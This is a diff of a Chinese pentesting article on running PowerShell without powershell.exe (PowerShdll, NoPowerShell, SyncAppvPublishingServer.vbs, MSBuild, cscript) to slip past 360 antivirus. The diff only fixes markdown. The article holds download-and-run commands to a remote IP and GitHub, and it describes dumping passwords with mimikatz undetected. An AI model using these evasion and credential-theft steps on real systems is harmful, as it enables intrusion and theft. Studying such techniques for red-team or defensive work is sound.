@@ -2,7 +2,7 @@
 
 今天给大家带来的是，无powershell运行powershell的一些姿势的分享，由于powershell的特性，使得它很受渗透测试爱好者的喜爱，当然也催生了像ASMI之类的防御手段，当然各类杀软也是把它纳入了查杀行列中，比如某套装，只要你调用PS就会查杀，着实恶心。
 
-![v2-7aa75c9a5348bf9b89794c1028d63102\_hd.j](https://pic3.zhimg.com/80/v2-7aa75c9a5348bf9b89794c1028d63102\_hd.jpg)
+![v2-7aa75c9a5348bf9b89794c1028d63102\_hd.j](https://pic3.zhimg.com/80/v2-7aa75c9a5348bf9b89794c1028d63102_hd.jpg)
 
 所以我们在与\*\*的对抗中也会想法设法的去bypass来执行PS，这里我便总结了几种无powershell执行powershell的姿势，希望能在实战的时候帮到大家。
 
@@ -13,8 +13,7 @@
 * Nopowershell
 * SyncAppvPublishingServer
 * 调用MSBuild.exe
-* 调用cscript\
-
+* 调用cscript<br>
 
 下面的实验如无特殊说明，均在windows server 2008 sp2 + 360最新版下进行
 
@@ -35,23 +34,23 @@ PowerLine是一款由c#编写的工具，支持本地命令行调用和远程调
 
 首先拉取项目到本地，然后运行build.bat文件
 
-![v2-b19a332b9c48e18c2ae422d1602f0600\_hd.j](https://pic1.zhimg.com/80/v2-b19a332b9c48e18c2ae422d1602f0600\_hd.jpg)
+![v2-b19a332b9c48e18c2ae422d1602f0600\_hd.j](https://pic1.zhimg.com/80/v2-b19a332b9c48e18c2ae422d1602f0600_hd.jpg)
 
 然后在UserConf.xml文件中填写你所需要调用的powershell脚本的地址，默认自带powerup、powerview、Mimikatz等，只要按照他给定的格式加入你的ps脚本地址即可
 
-![v2-c7bddf87384428ef971c72c5d09392fd\_hd.j](https://pic2.zhimg.com/80/v2-c7bddf87384428ef971c72c5d09392fd\_hd.jpg)
+![v2-c7bddf87384428ef971c72c5d09392fd\_hd.j](https://pic2.zhimg.com/80/v2-c7bddf87384428ef971c72c5d09392fd_hd.jpg)
 
 加入完成以后，运行PLBuilder.exe进行构建，构建过程中，360无提示
 
-![v2-daf9f3bb37ee598ffb2f2a530d7c6b8d\_hd.j](https://pic3.zhimg.com/80/v2-daf9f3bb37ee598ffb2f2a530d7c6b8d\_hd.jpg)
+![v2-daf9f3bb37ee598ffb2f2a530d7c6b8d\_hd.j](https://pic3.zhimg.com/80/v2-daf9f3bb37ee598ffb2f2a530d7c6b8d_hd.jpg)
 
 查看内置的脚本PowerLine.exe -ShowScripts
 
-![v2-dcef66a815c1a2db4081c002a4a26cb4\_hd.j](https://pic3.zhimg.com/80/v2-dcef66a815c1a2db4081c002a4a26cb4\_hd.jpg)
+![v2-dcef66a815c1a2db4081c002a4a26cb4\_hd.j](https://pic3.zhimg.com/80/v2-dcef66a815c1a2db4081c002a4a26cb4_hd.jpg)
 
 运行脚本，360无提示
 
-![v2-19a84fc4e0f055c7c53d10f65d5423b2\_hd.j](https://pic3.zhimg.com/80/v2-19a84fc4e0f055c7c53d10f65d5423b2\_hd.jpg)
+![v2-19a84fc4e0f055c7c53d10f65d5423b2\_hd.j](https://pic3.zhimg.com/80/v2-19a84fc4e0f055c7c53d10f65d5423b2_hd.jpg)
 
 但是在运行之后，360提示了报毒，并删掉了我的exe文件...一般\*\*只是检测PS发出的恶意请求，但由于在powerline中，请求是由powerline发出的，便绕过了一部分\*\*，但是缺点也是很明显，就是可扩展性太差，所有的功能依赖于配置文件...
 
@@ -67,11 +66,11 @@ exe版使用方法：
 
 使用PowerShdll -i进入到交互模式，此时便获得了一个交互式的PS环境，可执行任意的powershell命令，整个过程360无拦截
 
-![v2-0ae862b686a3088aaa82373936e1cd65\_hd.j](https://pic3.zhimg.com/80/v2-0ae862b686a3088aaa82373936e1cd65\_hd.jpg)
+![v2-0ae862b686a3088aaa82373936e1cd65\_hd.j](https://pic3.zhimg.com/80/v2-0ae862b686a3088aaa82373936e1cd65_hd.jpg)
 
 下载mimikatz抓取密码，360全程无反应...
 
-![v2-355a8fd9d022cc77bd05b81229fec460\_hd.j](https://pic4.zhimg.com/80/v2-355a8fd9d022cc77bd05b81229fec460\_hd.jpg)
+![v2-355a8fd9d022cc77bd05b81229fec460\_hd.j](https://pic4.zhimg.com/80/v2-355a8fd9d022cc77bd05b81229fec460_hd.jpg)
 
 在交互式模式下唯一要注意的就是，你输入的内容不能过长，否则会出现问题，原因未可知....
 
@@ -83,7 +82,7 @@ rundll32 PowerShdll.dll,main . { iwr -useb https://raw.githubusercontent.com/pee
 
 这次没有那么好运了，直接被360杀了
 
-![v2-ff8e0c8659f2c9a0d46f6f0984d4373d\_hd.j](https://pic1.zhimg.com/80/v2-ff8e0c8659f2c9a0d46f6f0984d4373d\_hd.jpg)
+![v2-ff8e0c8659f2c9a0d46f6f0984d4373d\_hd.j](https://pic1.zhimg.com/80/v2-ff8e0c8659f2c9a0d46f6f0984d4373d_hd.jpg)
 
 Nopowershell
 
@@ -104,17 +103,17 @@ NoPowerShell是用C＃实现的工具，它支持执行类似PowerShell的命令
 
 直接运行便会输出它的版本和支持的命令
 
-![v2-5bb8d41f49533681621c9711396dafe9\_hd.j](https://pic3.zhimg.com/80/v2-5bb8d41f49533681621c9711396dafe9\_hd.jpg)
+![v2-5bb8d41f49533681621c9711396dafe9\_hd.j](https://pic3.zhimg.com/80/v2-5bb8d41f49533681621c9711396dafe9_hd.jpg)
 
 过程360无拦截
 
 而dll版被秒杀..
 
-![v2-d8d4c0af1e654a5cc404733d04a88b19\_hd.j](https://pic1.zhimg.com/80/v2-d8d4c0af1e654a5cc404733d04a88b19\_hd.jpg)
+![v2-d8d4c0af1e654a5cc404733d04a88b19\_hd.j](https://pic1.zhimg.com/80/v2-d8d4c0af1e654a5cc404733d04a88b19_hd.jpg)
 
 cs下稳定..
 
-![v2-4bb2cf81da77ba1be4b7ad8a373c7951\_hd.j](https://pic2.zhimg.com/80/v2-4bb2cf81da77ba1be4b7ad8a373c7951\_hd.jpg)
+![v2-4bb2cf81da77ba1be4b7ad8a373c7951\_hd.j](https://pic2.zhimg.com/80/v2-4bb2cf81da77ba1be4b7ad8a373c7951_hd.jpg)
 
 这里要注意一点的是，脚本默认调用scripts下的文件，国内的cs大多为script目录，自行修改文件内的目录即可。
 
@@ -130,7 +129,7 @@ SyncAppvPublishingServer是win10自带的服务，有vbs和exe两个版本，我
 
 默认存放在C:\Windows\System32下面
 
-![v2-c8a15002fffa1f7fafc621d5a641280a\_hd.j](https://pic3.zhimg.com/80/v2-c8a15002fffa1f7fafc621d5a641280a\_hd.jpg)
+![v2-c8a15002fffa1f7fafc621d5a641280a\_hd.j](https://pic3.zhimg.com/80/v2-c8a15002fffa1f7fafc621d5a641280a_hd.jpg)
 
 用法实例：
 
@@ -140,7 +139,7 @@ SyncAppvPublishingServer是win10自带的服务，有vbs和exe两个版本，我
 C:\Windows\System32\SyncAppvPublishingServer.vbs "Break; Start-Process Calc.exe ”
 ```
 
-![v2-930494ab6efee445a9cc19d3d67d37b2\_hd.j](https://pic4.zhimg.com/80/v2-930494ab6efee445a9cc19d3d67d37b2\_hd.jpg)
+![v2-930494ab6efee445a9cc19d3d67d37b2\_hd.j](https://pic4.zhimg.com/80/v2-930494ab6efee445a9cc19d3d67d37b2_hd.jpg)
 
 或者：
 
@@ -148,7 +147,7 @@ C:\Windows\System32\SyncAppvPublishingServer.vbs "Break; Start-Process Calc.exe 
 C:\Windows\System32\SyncAppvPublishingServer.vbs "Break; iwr http://192.168.1.149:443"
 ```
 
-![v2-1134f3f8d147184d8b23149e203c73e4\_hd.j](https://pic4.zhimg.com/80/v2-1134f3f8d147184d8b23149e203c73e4\_hd.jpg)
+![v2-1134f3f8d147184d8b23149e203c73e4\_hd.j](https://pic4.zhimg.com/80/v2-1134f3f8d147184d8b23149e203c73e4_hd.jpg)
 
 你也可以去远程下载执行一些ps脚本就像下面这样：
 
@@ -183,7 +182,7 @@ echo "hello from powershell-less"echo "this is your pid:$PID"$psversiontable
 
 效果：
 
-![v2-59f23238959a2b978143ea7f2319f15f\_hd.j](https://pic1.zhimg.com/80/v2-59f23238959a2b978143ea7f2319f15f\_hd.jpg)
+![v2-59f23238959a2b978143ea7f2319f15f\_hd.j](https://pic1.zhimg.com/80/v2-59f23238959a2b978143ea7f2319f15f_hd.jpg)
 
 全程360无提示..
 
@@ -191,7 +190,7 @@ github上也有类似的项目：[https://github.com/Cn33liz/MSBuildShell.git](h
 
 执行完之后获得一个交互式的PS
 
-![v2-bf5b52a3e899d776abb70e849aa50593\_hd.j](https://pic3.zhimg.com/80/v2-bf5b52a3e899d776abb70e849aa50593\_hd.jpg)
+![v2-bf5b52a3e899d776abb70e849aa50593\_hd.j](https://pic3.zhimg.com/80/v2-bf5b52a3e899d776abb70e849aa50593_hd.jpg)
 
 调用cscript：
 
@@ -211,7 +210,7 @@ Error: loading assembly information.The generated script might not work correctl
 
 首先使用vs打开项目，然后切换到TestClass.cs，并注释掉MessageBox这个方法，不然每次运行都会得到一个messageBox
 
-![v2-55490b44a2bbaa1b1dfe72bb979b0c78\_hd.j](https://pic3.zhimg.com/80/v2-55490b44a2bbaa1b1dfe72bb979b0c78\_hd.jpg)
+![v2-55490b44a2bbaa1b1dfe72bb979b0c78\_hd.j](https://pic3.zhimg.com/80/v2-55490b44a2bbaa1b1dfe72bb979b0c78_hd.jpg)
 
 然后，因为需要调用PS，所以我们需要引入”System.Management.Automation.Runspaces”，“ System.Management.Automation“，我们可以在PS下使用下面的命令进行查询该dll的位置，然后手动引入
 
@@ -219,7 +218,7 @@ Error: loading assembly information.The generated script might not work correctl
 [psobject].Assembly.Location
 ```
 
-![v2-e7b5329bbd4321c8e29ffa6f5f555877\_hd.j](https://pic2.zhimg.com/80/v2-e7b5329bbd4321c8e29ffa6f5f555877\_hd.jpg)
+![v2-e7b5329bbd4321c8e29ffa6f5f555877\_hd.j](https://pic2.zhimg.com/80/v2-e7b5329bbd4321c8e29ffa6f5f555877_hd.jpg)
 
 引入之后，并且在TestClass中加入以下方法：
 
@@ -245,7 +244,7 @@ cscript //e:jscript testps.txt
 
 但是360无情的杀死了我们....
 
-![v2-03f43a71253a31846977de882b9b4e13\_hd.j](https://pic4.zhimg.com/80/v2-03f43a71253a31846977de882b9b4e13\_hd.jpg)
+![v2-03f43a71253a31846977de882b9b4e13\_hd.j](https://pic4.zhimg.com/80/v2-03f43a71253a31846977de882b9b4e13_hd.jpg)
 
 写在后面：
 
@@ -259,4 +258,4 @@ cscript //e:jscript testps.txt
 
 [https://pentestn00b.wordpress.com/2017/03/20/simple-bypass-for-powershell-constrained-language-mode/](https://pentestn00b.wordpress.com/2017/03/20/simple-bypass-for-powershell-constrained-language-mode/)
 
-[https://www.\*\*\*\*\*\*\*.com/watch?v=7tvfb9poTKg\&feature=youtu.be](https://www.\*\*\*\*\*\*\*.com/watch?v=7tvfb9poTKg\&feature=youtu.be)
+[https://www.\*\*\*\*\*\*\*.com/watch?v=7tvfb9poTKg\&feature=youtu.be](https://www.*******.com/watch?v=7tvfb9poTKg\&feature=youtu.be)
